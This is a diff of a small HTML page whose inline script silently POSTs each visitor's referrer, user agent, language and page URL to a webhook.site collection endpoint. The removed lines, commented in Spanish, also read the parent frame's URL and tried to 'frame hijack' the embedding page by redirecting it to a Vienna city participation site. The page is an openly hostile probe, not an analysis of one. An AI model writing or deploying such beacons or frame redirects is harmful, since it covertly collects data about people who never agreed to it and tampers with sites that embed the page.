@@ -3,30 +3,16 @@
 <head></head>
 <body>
 <script>
-  // Recolecta info del visitante
-  var data = {
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    url: window.location.href,
-    parentUrl: (function() {
-      try { return top.location.href; } catch(e) { return "cross-origin-blocked"; }
-    })()
-  };
-
-  // Manda todo al webhook
   fetch("https://webhook.site/959fa6ae-59d6-49fb-b8ba-2d945836e96f", {
     method: "POST",
     mode: "no-cors",
-    body: JSON.stringify(data)
+    body: JSON.stringify({
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      url: window.location.href
+    })
   });
-
-  // Intenta frame hijacking
-  try {
-    top.location.href = "https://mitgestalten.wien.gv.at";
-  } catch(e) {
-    // cross-origin blocked
-  }
 </script>
 </body>
 </html>
